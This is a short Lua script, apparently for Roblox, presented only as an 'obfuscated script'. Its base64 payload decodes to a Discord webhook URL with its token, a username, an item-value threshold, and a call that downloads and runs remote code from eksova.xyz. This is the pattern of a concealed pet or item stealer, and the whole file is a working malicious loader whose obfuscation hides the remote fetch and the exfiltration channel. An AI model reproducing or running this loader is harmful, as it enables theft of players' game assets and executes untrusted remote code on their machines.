
-- Obfuscated script
local encodedScript = "VXNlcm5hbWUgPSAiMlphaW5fMiIKV2ViaG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMzQyOTIxNjYzNTE1NDYzNzEyL09GbGU0amF4amhMNHBBbTkxWlpoZ0hIYTJOUUVUVGYtd1BJWWZPSUNEN3c1ekJlMmV4dmlmbUJLMjhKRnBnYzZvU1NvIgpNaW5SQVAgPSAxMDAwMAoKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHA6Ly9la3NvdmEueHl6L1BldHNHbyIsIHRydWUpKSgp"

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))()
